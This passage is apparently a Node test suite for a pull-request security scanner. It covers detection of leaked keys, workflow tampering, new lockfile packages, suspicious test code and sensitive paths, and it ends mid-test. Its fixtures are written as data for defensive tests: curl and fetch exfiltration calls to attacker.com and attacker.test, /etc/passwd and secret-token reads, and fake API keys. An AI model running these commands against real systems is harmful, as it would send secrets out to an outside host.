import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  buildAdvisoryPayload,
  buildSecurityCheckRunOutput,
  formatCheckRunFlagList,
  formatFlagList,
  mdCode,
  findExistingDraftAdvisory,
  postFlaggedSecurityResult,
  postSecurityCheckRun,
  resolveTargetSha,
  scanSecrets,
  scanCITampering,
  scanBuildScripts,
  scanSupplyChain,
  scanTestPatterns,
  scanSensitivePaths,
  startScriptWatchdog,
  SCRIPT_WATCHDOG_MS,
  WATCHDOG_RETRY_RESERVE_MS,
  watchdogBoundFetch,
  syncDraftAdvisory,
  validateSensitivePaths,
} from '../check-pr-security.mjs';
import { ghFetch } from '../get-bot-token.mjs';

// ── scanSecrets ──────────────────────────────────────────────────────────────

test('scanSecrets: flags OpenAI key in added line', () => {
  const files = [{ filename: 'src/config.ts', patch: '+const key = "sk-abcdefghijklmnopqrstuvwxyz123456"' }];
  assert.ok(scanSecrets(files).length > 0);
});

test('scanSecrets: flags AWS key in added line', () => {
  const files = [{ filename: 'src/config.ts', patch: '+const awsKey = "AKIAIOSFODNN7EXAMPLE"' }];
  assert.ok(scanSecrets(files).length > 0);
});

test('scanSecrets: ignores removed lines', () => {
  const files = [{ filename: 'src/config.ts', patch: '-const key = "sk-abcdefghijklmnopqrstuvwxyz123456"' }];
  assert.equal(scanSecrets(files).length, 0);
});

test('scanSecrets: ignores files without patch', () => {
  assert.equal(scanSecrets([{ filename: 'large-file.ts' }]).length, 0);
});

// ── scanCITampering ──────────────────────────────────────────────────────────

test('scanCITampering: flags workflow file changes', () => {
  const files = [{ filename: '.github/workflows/pr.yml', status: 'modified' }];
  assert.ok(scanCITampering(files).length > 0);
});

test('scanCITampering: ignores non-workflow files', () => {
  const files = [{ filename: 'src/foo.ts', status: 'modified' }];
  assert.equal(scanCITampering(files).length, 0);
});

test('scanCITampering: ignores removed workflow files', () => {
  const files = [{ filename: '.github/workflows/old.yml', status: 'removed' }];
  assert.equal(scanCITampering(files).length, 0);
});

// ── scanBuildScripts ─────────────────────────────────────────────────────────

test('scanBuildScripts: flags changes to release.sh', () => {
  const files = [{ filename: 'scripts/release.sh', status: 'modified' }];
  assert.ok(scanBuildScripts(files).length > 0);
});

test('scanBuildScripts: ignores non-CI scripts', () => {
  const files = [{ filename: 'scripts/generate-org-chart-images.ts', status: 'modified' }];
  assert.equal(scanBuildScripts(files).length, 0);
});

// ── scanSupplyChain ──────────────────────────────────────────────────────────

test('scanSupplyChain: flags net-new packages in lockfile', () => {
  const patch = `@@ -1,3 +1,4 @@
 packages:
+  'evil-package@1.0.0':
   'existing-package@2.0.0':
-  'old-package@1.0.0':
`;
  const files = [{ filename: 'pnpm-lock.yaml', patch }];
  const flags = scanSupplyChain(files);
  assert.ok(flags.length > 0);
  assert.ok(flags[0].packages.includes('evil-package'));
});

test('scanSupplyChain: does not flag version-only bumps', () => {
  const patch = `@@ -1,3 +1,3 @@
 packages:
-  'existing-package@1.0.0':
+  'existing-package@2.0.0':
`;
  const files = [{ filename: 'pnpm-lock.yaml', patch }];
  assert.equal(scanSupplyChain(files).length, 0);
});

test('scanSupplyChain: flags pnpm v9-style unquoted package entries', () => {
  const patch = `@@ -1,2 +1,3 @@
+evil-package@1.0.0:
 existing-package@2.0.0:
`;
  const files = [{ filename: 'pnpm-lock.yaml', patch }];
  const flags = scanSupplyChain(files);
  assert.deepEqual(flags, [{ check: 'supply-chain', packages: ['evil-package'] }]);
});

test('scanSupplyChain: ignores peer suffixes when matching package names', () => {
  const patch = `@@ -1,2 +1,2 @@
-@scope/pkg@1.0.0(react@18.2.0):
+@scope/pkg@2.0.0(react@18.2.0):
`;
  const files = [{ filename: 'pnpm-lock.yaml', patch }];
  assert.equal(scanSupplyChain(files).length, 0);
});

test('scanSupplyChain: flags net-new packages that include pnpm peer suffixes', () => {
  const patch = `@@ -1,2 +1,3 @@
+evil-package@1.0.0(react@18.2.0):
 existing-package@2.0.0:
`;
  const files = [{ filename: 'pnpm-lock.yaml', patch }];
  const flags = scanSupplyChain(files);
  assert.deepEqual(flags, [{ check: 'supply-chain', packages: ['evil-package'] }]);
});

test('findExistingDraftAdvisory: returns matching draft advisory from paginated results', async () => {
  const calls = [];
  const fakeFetch = async (path) => {
    calls.push(path);
    if (/[?&]page=1(?:&|$)/.test(path)) {
      return Array.from({ length: 100 }, (_, i) => ({ summary: `Unrelated advisory ${i}` }));
    }
    if (/[?&]page=2(?:&|$)/.test(path)) {
      return [{ summary: '🚨 Security flag — PR #6469: ci-tampering' }];
    }
    return [];
  };

  const advisory = await findExistingDraftAdvisory(fakeFetch, 'token', 'paperclipai/paperclip', 6469);

  assert.deepEqual(advisory, { summary: '🚨 Security flag — PR #6469: ci-tampering' });
  assert.equal(calls.length, 2);
});

test('findExistingDraftAdvisory: returns null when no matching draft advisory exists', async () => {
  const fakeFetch = async () => [{ summary: 'Completely different advisory' }];
  const advisory = await findExistingDraftAdvisory(fakeFetch, 'token', 'paperclipai/paperclip', 6469);
  assert.equal(advisory, null);
});

test('findExistingDraftAdvisory: bails out at the page cap so a large backlog cannot hang the workflow', async () => {
  let pageCount = 0;
  const fakeFetch = async () => {
    pageCount += 1;
    return Array.from({ length: 100 }, (_, i) => ({ summary: `Unrelated advisory ${pageCount}-${i}` }));
  };

  const advisory = await findExistingDraftAdvisory(fakeFetch, 'token', 'paperclipai/paperclip', 6469);

  assert.equal(advisory, null);
  assert.equal(pageCount, 20, `expected pagination to run exactly 20 pages (the cap), got ${pageCount}`);
});

test('syncDraftAdvisory: patches an existing advisory with the latest flags', async () => {
  const calls = [];
  const flags = [
    { check: 'ci-tampering', file: '.github/workflows/pr.yml' },
    { check: 'secret-scan', file: 'src/config.ts', pattern: 'OpenAI API key' },
  ];

  await syncDraftAdvisory(async (path, token, options) => {
    calls.push({ path, token, options });
    if (path.includes('/security-advisories?state=draft')) {
      return [{ ghsa_id: 'GHSA-test-1234', summary: '🚨 Security flag — PR #6469: ci-tampering' }];
    }
    return { ok: true };
  }, 'token', 'paperclipai/paperclip', 6469, 'My PR', flags);

  assert.equal(calls.length, 2);
  assert.equal(calls[1].path, '/repos/paperclipai/paperclip/security-advisories/GHSA-test-1234');
  assert.equal(calls[1].options.method, 'PATCH');
  const patchBody = JSON.parse(calls[1].options.body);
  const { vulnerabilities, ...expectedPatch } = buildAdvisoryPayload(6469, 'My PR', flags);
  assert.deepEqual(patchBody, expectedPatch);
  assert.ok(!('vulnerabilities' in patchBody), 'PATCH must omit vulnerabilities (GitHub rejects empty array with 422)');
});

test('syncDraftAdvisory: creates a new advisory when none exists', async () => {
  const calls = [];
  const flags = [{ check: 'supply-chain', packages: ['evil-package'] }];

  await syncDraftAdvisory(async (path, token, options) => {
    calls.push({ path, token, options });
    if (path.includes('/security-advisories?state=draft')) {
      return [];
    }
    return { ok: true };
  }, 'token', 'paperclipai/paperclip', 6469, 'My PR', flags);

  assert.equal(calls.length, 2);
  assert.equal(calls[1].path, '/repos/paperclipai/paperclip/security-advisories');
  assert.equal(calls[1].options.method, 'POST');
  assert.deepEqual(JSON.parse(calls[1].options.body), buildAdvisoryPayload(6469, 'My PR', flags));
});

test('postSecurityCheckRun: links the advisory when the sync succeeded', async () => {
  const calls = [];

  await postSecurityCheckRun(async (path, token, options) => {
    calls.push({ path, token, options });
    return { ok: true };
  }, 'token', 'paperclipai/paperclip', 'deadbeef', true, {
    flags: [{ check: 'ci-tampering', file: '.github/workflows/pr.yml' }],
    advisoryResult: { ok: true, url: 'https://github.com/paperclipai/paperclip/security/advisories/GHSA-test-1234' },
  });

  assert.equal(calls.length, 1);
  assert.equal(calls[0].path, '/repos/paperclipai/paperclip/check-runs');
  assert.equal(calls[0].options.method, 'POST');
  const body = JSON.parse(calls[0].options.body);
  assert.deepEqual(body, {
    name: 'security-review',
    head_sha: 'deadbeef',
    status: 'completed',
    conclusion: 'neutral',
    output: {
      title: 'Security Review Recommended',
      summary: 'Draft advisory filed for maintainer review: https://github.com/paperclipai/paperclip/security/advisories/GHSA-test-1234. Not a merge block — review the advisory at your leisure.',
    },
  });
});

// ── resolveTargetSha ─────────────────────────────────────────────────────────

test('resolveTargetSha: uses PR head sha when no merge-queue candidate sha is provided', () => {
  const pr = { head: { sha: 'prheadsha' } };
  assert.equal(resolveTargetSha(pr, undefined), 'prheadsha');
  assert.equal(resolveTargetSha(pr, ''), 'prheadsha');
});

test('resolveTargetSha: prefers the merge-queue candidate sha over the PR head sha', () => {
  const pr = { head: { sha: 'prheadsha' } };
  assert.equal(resolveTargetSha(pr, 'queuecandidatesha'), 'queuecandidatesha');
});

test('postSecurityCheckRun: reports unknown advisory state and inlines redacted flags when sync failed', async () => {
  const calls = [];
  const detectedToken = 'sk-abcdefghijklmnopqrstuvwxyz123456';
  const flags = [
    { check: 'ci-tampering', file: '.github/workflows/pr.yml' },
    { check: 'secret-scan', file: 'src/config.ts', pattern: 'OpenAI API key', line: `+const token = "${detectedToken}"` },
  ];

  await postSecurityCheckRun(async (path, token, options) => {
    calls.push({ path, token, options });
    return { ok: true };
  }, 'token', 'paperclipai/paperclip', 'deadbeef', true, {
    flags,
    advisoryResult: { ok: false, error: '403: Resource not accessible by integration' },
  });

  assert.equal(calls.length, 1);
  const body = JSON.parse(calls[0].options.body);

  assert.equal(body.conclusion, 'neutral', 'must still never block merge');
  assert.ok(
    !body.output.summary.includes('Draft advisory filed'),
    `summary must not claim an advisory was filed: ${body.output.summary}`,
  );
  assert.ok(body.output.summary.includes('403'), 'summary should surface the failure reason');
  assert.ok(body.output.summary.includes('advisory state is unknown'));
  assert.ok(body.output.text.includes('ci-tampering'), 'flags must be inlined in output.text');
  assert.ok(body.output.text.includes('.github/workflows/pr.yml'));
  assert.ok(body.output.text.includes('secret-scan'));
  assert.ok(body.output.text.includes('OpenAI API key'));
  assert.ok(!body.output.text.includes(detectedToken), 'check-run output must not disclose captured secret values');
});

test('postSecurityCheckRun: still inlines flags and stays truthful when no advisory sync was attempted', async () => {
  const calls = [];
  const flags = [{ check: 'supply-chain', packages: ['evil-package'] }];

  await postSecurityCheckRun(async (path, token, options) => {
    calls.push({ path, token, options });
    return { ok: true };
  }, 'token', 'paperclipai/paperclip', 'deadbeef', true, { flags });

  const body = JSON.parse(calls[0].options.body);
  assert.ok(!body.output.summary.includes('Draft advisory filed'));
  assert.ok(body.output.text.includes('evil-package'));
});

test('postSecurityCheckRun: "all clear" path is unaffected by the advisory plumbing', async () => {
  const calls = [];

  await postSecurityCheckRun(async (path, token, options) => {
    calls.push({ path, token, options });
    return { ok: true };
  }, 'token', 'paperclipai/paperclip', 'deadbeef', false);

  const body = JSON.parse(calls[0].options.body);
  assert.deepEqual(body, {
    name: 'security-review',
    head_sha: 'deadbeef',
    status: 'completed',
    conclusion: 'success',
    output: {
      title: 'Security Review Passed',
      summary: 'No security concerns detected.',
    },
  });
});

test('postFlaggedSecurityResult: advisory budget expiry still posts the check-run', async () => {
  const calls = [];
  const fakeFetch = (path, _token, options = {}) => {
    calls.push(path);
    if (path.endsWith('/check-runs')) return Promise.resolve({ ok: true });

    return new Promise((_resolve, reject) => {
      options.signal?.addEventListener('abort', () => reject(options.signal.reason), { once: true });
    });
  };

  await postFlaggedSecurityResult(
    fakeFetch,
    'token',
    'paperclipai/paperclip',
    { number: 6469, title: 'My PR', head: { sha: 'deadbeef' } },
    [{ check: 'ci-tampering', file: '.github/workflows/pr.yml' }],
    20,
  );

  assert.ok(calls.some(path => path.includes('/security-advisories?state=draft')));
  assert.ok(calls.some(path => path.endsWith('/check-runs')), 'check-run must be attempted after advisory timeout');
});

test('postFlaggedSecurityResult: defaults the check-run to the PR head sha', async () => {
  let checkRunBody;
  const fakeFetch = async (path, _token, options = {}) => {
    if (path.endsWith('/check-runs')) {
      checkRunBody = JSON.parse(options.body);
      return { ok: true };
    }
    return [];
  };

  await postFlaggedSecurityResult(
    fakeFetch,
    'token',
    'paperclipai/paperclip',
    { number: 6469, title: 'My PR', head: { sha: 'prheadsha' } },
    [{ check: 'ci-tampering', file: '.github/workflows/pr.yml' }],
    5_000,
  );

  assert.equal(
    checkRunBody.head_sha,
    'prheadsha',
    'omitting targetSha must preserve pull_request_target behaviour exactly',
  );
});

test('postFlaggedSecurityResult: posts the check-run against the merge-queue candidate sha when given one', async () => {
  let checkRunBody;
  const fakeFetch = async (path, _token, options = {}) => {
    if (path.endsWith('/check-runs')) {
      checkRunBody = JSON.parse(options.body);
      return { ok: true };
    }
    return [];
  };

  await postFlaggedSecurityResult(
    fakeFetch,
    'token',
    'paperclipai/paperclip',
    { number: 6469, title: 'My PR', head: { sha: 'prheadsha' } },
    [{ check: 'ci-tampering', file: '.github/workflows/pr.yml' }],
    5_000,
    'queuecandidatesha',
  );

  assert.equal(
    checkRunBody.head_sha,
    'queuecandidatesha',
    'flagged check-run must land on the commit actually being merged, not the stale PR head',
  );
});

test('postFlaggedSecurityResult: advisory POST that commits before abort reports unknown state', async () => {  let advisoryCommitted = false;
  let checkRunBody;
  const fakeFetch = async (path, _token, options = {}) => {
    if (path.includes('/security-advisories?state=draft')) return [];
    if (path.endsWith('/security-advisories')) {
      advisoryCommitted = true;
      const error = new Error('request aborted after server commit');
      error.name = 'AbortError';
      throw error;
    }
    if (path.endsWith('/check-runs')) {
      checkRunBody = JSON.parse(options.body);
      return { ok: true };
    }
    throw new Error(`unexpected path: ${path}`);
  };

  await postFlaggedSecurityResult(
    fakeFetch,
    'token',
    'paperclipai/paperclip',
    { number: 6469, title: 'My PR', head: { sha: 'deadbeef' } },
    [{ check: 'ci-tampering', file: '.github/workflows/pr.yml' }],
    1_000,
  );

  assert.equal(advisoryCommitted, true);
  assert.ok(checkRunBody.output.summary.includes('advisory state is unknown'));
  assert.ok(!checkRunBody.output.summary.includes('was **not** created'));
});

// ── buildSecurityCheckRunOutput ─────────────────────────────────────────────

test('buildSecurityCheckRunOutput: 403 advisory failure never asserts an advisory exists', () => {
  const flags = [{ check: 'ci-tampering', file: '.github/workflows/pr.yml' }];
  const output = buildSecurityCheckRunOutput(true, flags, {
    ok: false,
    error: '403: Resource not accessible by integration',
  });

  assert.ok(!output.summary.includes('Draft advisory filed'));
  assert.ok(output.text.includes('ci-tampering'));
});

test('formatCheckRunFlagList: bounds oversized output and reports omitted findings', () => {
  const flags = Array.from({ length: 1_000 }, (_, index) => ({
    check: 'sensitive-path',
    file: `server/src/routes/${index}-${'x'.repeat(900)}.ts`,
  }));

  const text = formatCheckRunFlagList(flags);

  assert.ok(text.length <= 60_000, `check-run text is ${text.length} characters`);
  assert.match(text, /\d+ finding\(s\) omitted due to check-run output limits/);
});

test('validateSensitivePaths: checks paths against the resolved base ref instead of master', async () => {
  const seenPaths = [];
  const stale = await validateSensitivePaths(
    'token',
    'paperclipai/paperclip',
    6469,
    'release/1.2',
    async (path) => {
      seenPaths.push(path);
      return { ok: true };
    },
  );

  assert.deepEqual(stale, []);
  assert.ok(seenPaths.every(path => path.includes('ref=release%2F1.2')));
  assert.ok(!seenPaths.some(path => path.includes('ref=master')));
});

test('validateSensitivePaths: returns only 404 paths and rethrows non-404 errors', async () => {
  let seen404 = false;
  const stale = await validateSensitivePaths(
    'token',
    'paperclipai/paperclip',
    6469,
    'main',
    async (path) => {
      if (!seen404) {
        seen404 = true;
        throw new Error('GitHub API GET /contents/foo → 404: missing');
      }
      return { ok: true };
    },
  );

  assert.equal(stale.length, 1);

  await assert.rejects(
    validateSensitivePaths(
      'token',
      'paperclipai/paperclip',
      6469,
      'main',
      async () => {
        throw new Error('GitHub API GET /contents/foo → 500: boom');
      },
    ),
    /500: boom/
  );
});

test('validateSensitivePaths: a rate-limited read re-throws even when its message contains 404 (BLO-37010)', async () => {
  // The not-evaluated message interpolates wait and budget seconds; a reset
  // ~404s out reads "Next retry needs 404s". That is not a missing path.
  const realistic = new Error(
    'RATE_LIMIT_NOT_EVALUATED: GitHub API GET /contents/foo → 403 rate limited. Next retry needs 404s but only 12s of the 60s budget remains.',
  );
  realistic.rateLimited = true;
  await assert.rejects(
    validateSensitivePaths('token', 'paperclipai/paperclip', 6469, 'main', async () => { throw realistic; }),
    err => err === realistic,
  );
  // Precedence: the structured flag decides, not the message text. Even text
  // that matches the 404 delimiter must not turn a read that never completed
  // into a stale-path finding.
  const flagged = new Error('RATE_LIMIT_NOT_EVALUATED: GitHub API GET /contents/foo → 404 rate limited.');
  flagged.rateLimited = true;
  await assert.rejects(
    validateSensitivePaths('token', 'paperclipai/paperclip', 6469, 'main', async () => { throw flagged; }),
    err => err === flagged,
  );
});

test('validateSensitivePaths: a non-404 failure whose URL contains 404 re-throws, not stale (BLO-37010)', async () => {
  // The request URL carries the base SHA as ?ref=, and a SHA can contain 404.
  await assert.rejects(
    validateSensitivePaths('token', 'paperclipai/paperclip', 6469, 'main', async () => {
      throw new Error('GitHub API GET /repos/p/p/contents/foo?ref=ab404cd → 403: Resource not accessible');
    }),
    /403: Resource not accessible/,
  );
});

// ── scanTestPatterns ─────────────────────────────────────────────────────────

test('scanTestPatterns: flags outbound fetch in test file', () => {
  const files = [{
    filename: 'src/foo.test.ts',
    patch: `+  const res = await fetch('https://attacker.com/collect')`,
  }];
  assert.ok(scanTestPatterns(files).length > 0);
});

test('scanTestPatterns: flags execSync in test file', () => {
  const files = [{
    filename: 'src/foo.test.ts',
    patch: `+  execSync('curl https://attacker.com?data=' + secret)`,
  }];
  assert.ok(scanTestPatterns(files).length > 0);
});

test('scanTestPatterns: ignores suspicious patterns in non-test files', () => {
  const files = [{
    filename: 'src/api.ts',
    patch: `+  const res = await fetch('https://api.example.com')`,
  }];
  assert.equal(scanTestPatterns(files).length, 0);
});

test('scanTestPatterns: flags suspicious patterns in __tests__ directories', () => {
  const files = [{
    filename: 'src/__tests__/foo.ts',
    patch: `+  execSync('curl https://attacker.com?data=' + secret)`,
  }];
  assert.ok(scanTestPatterns(files).length > 0);
});

// ── scanTestPatterns: shell-exec receiver constraint (PEN-6177) ───────────────
//
// `exec`/`spawn` are ordinary JavaScript method names. These pin both arms of
// the split: a call with no receiver is reported on its own, a member call only
// with `child_process` corroboration in the same patch.

const shellExecPatterns = (patch, filename = 'src/foo.test.ts') =>
  scanTestPatterns([{ filename, patch }])
    .filter(f => f.pattern === 'shell-exec');

test('scanTestPatterns: does not flag RegExp.prototype.exec in a file that never shells out', () => {
  // The line that produced the PEN-6177 false positive on Blockcast/paperclip#3557.
  const patch = `+  const match = BLOB_URL.exec(url) ?? RAW_URL.exec(url);`;
  assert.deepEqual(shellExecPatterns(patch), []);
});

test('scanTestPatterns: does not flag a non-shell .exec() method (Postgres client)', () => {
  const patch = '+  await pg.exec(`select 1`);';
  assert.deepEqual(shellExecPatterns(patch), []);
});

test('scanTestPatterns: flags a bare execSync call', () => {
  const patch = `+  execSync('curl https://attacker.test?data=' + secret)`;
  assert.equal(shellExecPatterns(patch).length, 1);
});

test('scanTestPatterns: flags a bare spawnSync call, including the spread form', () => {
  assert.equal(shellExecPatterns(`+  const r = spawnSync('bash', [script]);`).length, 1);
  assert.equal(shellExecPatterns(`+  ...spawnSync('bash', [script], { encoding: 'utf8' }),`).length, 1);
});

test('scanTestPatterns: flags bare execFile and execFileSync calls', () => {
  assert.equal(shellExecPatterns(`+  execFileSync('git', ['init'], { cwd: dir });`).length, 1);
  assert.equal(shellExecPatterns(`+  execFile('git', ['init'], { cwd: dir }, done);`).length, 1);
});

test('scanTestPatterns: flags a member call when the patch brings child_process in', () => {
  const patch = [
    `+import * as cp from 'node:child_process';`,
    `+  cp.exec('curl https://attacker.test?data=' + secret);`,
  ].join('\n');
  assert.equal(shellExecPatterns(patch).length, 1);
});

test('scanTestPatterns: does not flag the same member call without child_process in the patch', () => {
  const patch = `+  cp.exec('curl https://attacker.test?data=' + secret);`;
  assert.deepEqual(shellExecPatterns(patch), []);
});

test('scanTestPatterns: ignores a removed execSync line', () => {
  const patch = `-  execSync('curl https://attacker.test?data=' + secret)`;
  assert.deepEqual(shellExecPatterns(patch), []);
});

// ── scanTestPatterns: shell-exec residuals (PEN-6204) ────────────────────────
//
// Each pair below is one mechanism: a must-flag fixture and a must-NOT-flag
// fixture. Each was shown to red under a mutation removing ONLY its own
// mechanism, so a later edit that drops one cannot stay green on the back of
// another (the receiver arm, the optional-call form, and the `^` anchor are
// independent, and `\s`-style overlap between them would make these vacuous).

test('scanTestPatterns: flags Bun.spawn with no child_process in the patch', () => {
  // The coverage the PEN-6177 narrowing dropped: `Bun` names the mechanism, so
  // the member arm's `child_process` corroboration never arrives.
  assert.equal(shellExecPatterns('+  Bun.spawn(["sh", "-c", cmd]);').length, 1);
  assert.equal(shellExecPatterns('+  Bun.spawnSync(["sh", "-c", cmd]);').length, 1);
  assert.equal(shellExecPatterns('+  Bun?.spawn(["sh", "-c", cmd]);').length, 1);
});

test('scanTestPatterns: does not flag a receiver that merely ends in the allowlisted name', () => {
  // The allowlist is a whole-identifier match, not a substring one -- otherwise
  // it re-opens the false-positive class PEN-6177 closed.
  assert.deepEqual(shellExecPatterns('+  myBun.spawn(["ls"]);'), []);
  assert.deepEqual(shellExecPatterns('+  config.Bun.spawn(["ls"]);'), []);
});

test('scanTestPatterns: flags the optional-call form, which still invokes', () => {
  assert.equal(shellExecPatterns(`+  execSync?.('curl ' + url);`).length, 1);
  assert.equal(shellExecPatterns(`+  Bun.spawn?.(["sh", "-c", cmd]);`).length, 1);
});

test('scanTestPatterns: does not flag an optional call on a non-shell receiver', () => {
  // `?.` must not become a way back in for `RegExp.prototype.exec`.
  assert.deepEqual(shellExecPatterns('+  const m = BLOB_URL.exec?.(url);'), []);
});

test('scanTestPatterns: ignores a removed line that carries a + earlier on it', () => {
  // Unanchored, `\+.*` was satisfied by the `+` in `base + suffix` and this
  // removed line reported as if the PR had added it.
  assert.deepEqual(shellExecPatterns('-  const cmd = base + suffix; execSync(cmd);'), []);
  assert.deepEqual(shellExecPatterns('   const cmd = base + suffix; execSync(cmd);'), []);
});

test('scanTestPatterns: still flags an added line that carries a + earlier on it', () => {
  // The must-flag half of the anchor: anchoring must not cost a true positive.
  assert.equal(shellExecPatterns('+  const cmd = base + suffix; execSync(cmd);').length, 1);
});

test('scanTestPatterns: the anchor applies to every suspicious pattern, not just shell-exec', () => {
  const removed = (patch) => scanTestPatterns([{ filename: 'src/foo.test.ts', patch }]);
  assert.deepEqual(removed('-  const u = base + path; await fetch(u);'), []);
  assert.deepEqual(removed('-  const k = a + b; const t = process.env.SECRET_TOKEN;'), []);
  assert.deepEqual(removed('-  const p = dir + name; readFileSync("/etc/passwd");'), []);
});

test('scanTestPatterns: the flag names the matched line', () => {
  const [flag] = shellExecPatterns(`+  execSync('curl https://attacker.test?data=' + secret)`);
  assert.equal(flag.line, `+  execSync('curl https://attacker.test?data=' + secret)`);
});

test('scanTestPatterns: the named line is one the firing arm matched', () => {
  // An uncorroborated member call sits ABOVE the bare call that actually fired.
  // Reporting the member line would point the reader at an arm that declined.
  const patch = ['+  const m = BLOB_URL.exec(url);', `+  execSync('ls');`].join('\n');
  const [flag] = shellExecPatterns(patch);
  assert.equal(flag.line, `+  execSync('ls');`);
});

test('scanTestPatterns: a long matched line is capped', () => {
  const [flag] = shellExecPatterns(`+  execSync('${'a'.repeat(400)}');`);
  assert.equal(flag.line.length, 120);
});

// ── scanSensitivePaths ───────────────────────────────────────────────────────

test('scanSensitivePaths: flags changes to agents route (API key IDOR / cross-tenant)', () => {
  const files = [{ filename: 'server/src/routes/agents.ts', status: 'modified' }];
  assert.ok(scanSensitivePaths(files).length > 0);
});

test('scanSensitivePaths: flags changes to MarkdownBody (XSS via urlTransform)', () => {
  const files = [{ filename: 'ui/src/components/MarkdownBody.tsx', status: 'modified' }];
  assert.ok(scanSensitivePaths(files).length > 0);
});

test('scanSensitivePaths: flags changes to company-skills route (malicious skill exfil)', () => {
  const files = [{ filename: 'server/src/routes/company-skills.ts', status: 'modified' }];
  assert.ok(scanSensitivePaths(files).length > 0);
});

test('scanSensitivePaths: ignores unrelated paths', () => {
  const files = [{ filename: 'server/src/utils/date.ts', status: 'modified' }];
  assert.equal(scanSensitivePaths(files).length, 0);
});

test('scanSensitivePaths: ignores removed files even on sensitive paths', () => {
  const files = [{ filename: 'server/src/routes/agents.ts', status: 'removed' }];
  assert.equal(scanSensitivePaths(files).length, 0);
});

// ── startScriptWatchdog ──────────────────────────────────────────────────────

test('startScriptWatchdog: fires exit(0) when the wall-clock budget is exceeded', async () => {
  let exitCode = null;
  const fakeExit = (code) => { exitCode = code; };
  startScriptWatchdog(20, fakeExit);
  await new Promise((resolve) => setTimeout(resolve, 60));
  assert.equal(exitCode, 0, 'watchdog should have exited with code 0 by now');
});

test('startScriptWatchdog: cleared timer never fires', async () => {
  let exitCode = null;
  const fakeExit = (code) => { exitCode = code; };
  const timer = startScriptWatchdog(20, fakeExit);
  clearTimeout(timer);
  await new Promise((resolve) => setTimeout(resolve, 60));
  assert.equal(exitCode, null, 'cleared watchdog must not call exit');
});

// ── ghFetch timeout ──────────────────────────────────────────────────────────

test('ghFetch: aborts the request when the per-call timeout elapses', async () => {
  const originalFetch = globalThis.fetch;
  // Replace global fetch with one that respects the AbortSignal but never resolves on its own.
  globalThis.fetch = (_url, init) => new Promise((_resolve, reject) => {
    init?.signal?.addEventListener('abort', () => {
      const err = new Error('aborted');
      err.name = 'AbortError';
      reject(err);
    }, { once: true });
  });

  try {
    const start = Date.now();
    await assert.rejects(
      ghFetch('/repos/example/example/security-advisories', 'token', { timeoutMs: 30 }),
      /aborted|abort/i,
    );
    const elapsed = Date.now() - start;
    assert.ok(elapsed < 500, `ghFetch should abort within the timeout, took ${elapsed}ms`);
  } finally {
    globalThis.fetch = originalFetch;
  }
});

// ── watchdogBoundFetch ───────────────────────────────────────────────────────

test('watchdogBoundFetch: a read gets only the retry budget left before the watchdog', async () => {
  const seen = [];
  const fetchImpl = async (path, token, options) => { seen.push(options); return {}; };
  let clock = 1_000;
  const gh = watchdogBoundFetch(1_000, fetchImpl, () => clock);
  const signal = new AbortController().signal;

  clock = 1_000 + 30_000;
  await gh('/repos/o/r/pulls/1', 'tok', { signal });
  assert.equal(seen[0].retryBudgetMs, SCRIPT_WATCHDOG_MS - WATCHDOG_RETRY_RESERVE_MS - 30_000);
  assert.equal(seen[0].signal, signal, 'caller options still pass through');

  clock = 1_000 + SCRIPT_WATCHDOG_MS;
  await gh('/repos/o/r/pulls/1', 'tok');
  assert.equal(seen[1].retryBudgetMs, 0, 'no budget once the watchdog deadline has passed');
});

// ── mdCode: repo-controlled values in advisory / check-run markdown ──────────
//
// `file`, `line` and `packages` all come from the PR under review. Reading them
// back out of the rendered markdown needs an oracle that is independent of the
// generator, so this is a scanner for CommonMark 6.2 code spans rather than a
// string match against what `mdCode` happens to emit.
function codeSpans(md) {
  const spans = [];
  let i = 0;
  while (i < md.length) {
    if (md[i] !== '`') { i += 1; continue; }
    let j = i;
    while (j < md.length && md[j] === '`') j += 1;
    const fence = j - i;

    let k = j;
    let closed = null;
    while (k < md.length) {
      if (md[k] !== '`') { k += 1; continue; }
      let m = k;
      while (m < md.length && md[m] === '`') m += 1;
      if (m - k === fence) { closed = [k, m]; break; }
      k = m;
    }
    // An opening run with no matching closer is literal text, not a span.
    if (!closed) { i = j; continue; }

    let content = md.slice(j, closed[0]).replace(/\r\n|[\r\n]/g, ' ');
    if (content.length >= 2 && content.startsWith(' ') && content.endsWith(' ') && content.trim() !== '') {
      content = content.slice(1, -1);
    }
    spans.push(content);
    i = closed[1];
  }
  return spans;
}

test('codeSpans oracle: reads the spans CommonMark defines', () => {
  assert.deepEqual(codeSpans('`a`'), ['a']);
  assert.deepEqual(codeSpans('``a`b``'), ['a`b']);
  assert.deepEqual(codeSpans('`` ` ``'), ['`']);
  assert.deepEqual(codeSpans('`a` and `b`'), ['a', 'b']);
  assert.deepEqual(codeSpans('`unclosed'), [], 'an unclosed fence is literal text');
  assert.deepEqual(codeSpans('``x`'), [], 'a 2-backtick fence is not closed by a 1-backtick run');
});

test('mdCode: fences longer than the longest backtick run in the content', () => {
  assert.equal(mdCode('plain'), '`plain`');
  assert.equal(mdCode('a`b'), '``a`b``');
  assert.equal(mdCode('a``b'), '```a``b```');
});

test('mdCode: pads content that starts or ends with a backtick', () => {
  assert.equal(mdCode('`'), '`` ` ``');
  assert.equal(mdCode('`x`'), '`` `x` ``');
});

test('mdCode: every value round-trips out of its span unchanged', () => {
  const values = ['plain', 'a`b', '`', '`x`', '``', 'a  b', ' lead', 'trail ', '   ', '__bold__', 'x\ny'];
  for (const value of values) {
    const expected = value.replace(/\r\n|[\r\n]/g, ' ');
    assert.deepEqual(codeSpans(mdCode(value)), [expected], `round trip failed for ${JSON.stringify(value)}`);
  }
});

test('mdCode: flattens line endings so a value cannot forge a second flag entry', () => {
  const forged = mdCode('x\n- `secret-scan`: injected');
  assert.ok(!forged.includes('\n'), `a newline survived: ${forged}`);
  assert.deepEqual(codeSpans(forged), ['x - `secret-scan`: injected']);
});

test('mdCode: an absent value stays absent rather than becoming an empty span', () => {
  assert.equal(mdCode(''), '');
  assert.equal(mdCode(null), '');
  assert.equal(mdCode(undefined), '');
});

// ── formatFlagList: the advisory body ────────────────────────────────────────

test('formatFlagList: a __tests__ path is fenced instead of rendering as emphasis', () => {
  const file = 'server/src/__tests__/a.test.ts';
  const out = formatFlagList([{ check: 'suspicious-test', file, pattern: 'absolute-file-read' }]);
  assert.ok(codeSpans(out).includes(file), `path is not inside a code span: ${out}`);
});

test('formatFlagList: a backtick in the matched line stays inside one code span', () => {
  const line = '+const p = readFile(`/etc/hosts`);';
  const out = formatFlagList([{ check: 'suspicious-test', file: 'a.test.ts', pattern: 'absolute-file-read', line }]);
